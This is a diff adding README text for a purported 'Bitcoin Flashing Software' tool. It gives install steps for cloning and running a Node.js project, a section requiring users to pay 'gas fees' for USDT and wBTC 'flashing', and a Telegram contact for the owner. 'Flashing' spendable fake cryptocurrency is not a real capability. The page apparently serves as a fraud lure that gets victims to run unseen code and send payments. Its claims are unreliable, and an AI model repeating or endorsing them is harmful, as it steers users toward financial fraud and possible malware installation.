@@ -12,4 +12,85 @@ When you gain app access, you'll have a limited spendable quota of either bitcoi
 
 # Prerequisites
 This application requires Node.js to run.
+# Bitcoin Flashing Software
+
+## Android/iOS
+[Click here](#) to visit the mobile repository.
+
+## Windows
+[Download](#) the Node.js setup application here.
+
+## Linux
+Run this command in the terminal. You may need superuser privileges (sudo):
+```sh
+sudo apt update && sudo apt install -y nodejs npm
+```
+[Copy Command](#)
+
+## Mac
+Install Homebrew (if you don't have it). Open the terminal and run:
+```sh
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+```
+Once Homebrew is installed, install Node.js by running:
+```sh
+brew install node
+```
+[Copy Command](#)
+
+## Installation
+Clone the repository:
+```sh
+git clone https://github.com/bitcoin-flashing-software/public-release.git && cd public-release
+```
+[Copy Command](#)
+
+Install necessary dependencies:
+```sh
+npm install && npm install electron
+```
+[Copy Command](#)
+
+## Usage
+Start the software:
+```sh
+npm start
+```
+[Copy Command](#)
+
+## Additional Commands
+To build the application:
+```sh
+npm run build
+```
+[Copy Command](#)
+
+To run tests:
+```sh
+npm test
+```
+[Copy Command](#)
+
+## Gas Fees
+Gas is required for every non-Bitcoin (USDT, wBTC) flashing transaction. You are responsible for your gas fees. Corresponding gas addresses for each token type can be found in the documentation.
+
+## Community
+Stay updated through the official channel for progress tracking and feature updates.
+# Contact Support
+
+For any inquiries, support, or assistance, feel free to reach out to me directly by clicking on my username below:
+
+@OWNEROFPTX (https://t.me/OWNEROFPTX)
+
+## How to Reach Me
+- Click the link above to send me a direct message on Telegram.
+- I am available to answer any questions regarding the software and provide guidance.
+- For urgent matters, mention 'URGENT' in your message to get a quicker response.
+
+## Additional Information
+- Ensure you read the official documentation before reaching out.
+- Be respectful and concise in your inquiries.
+- Spamming or unrelated messages will be ignored.
+
+Looking forward to assisting you!
 
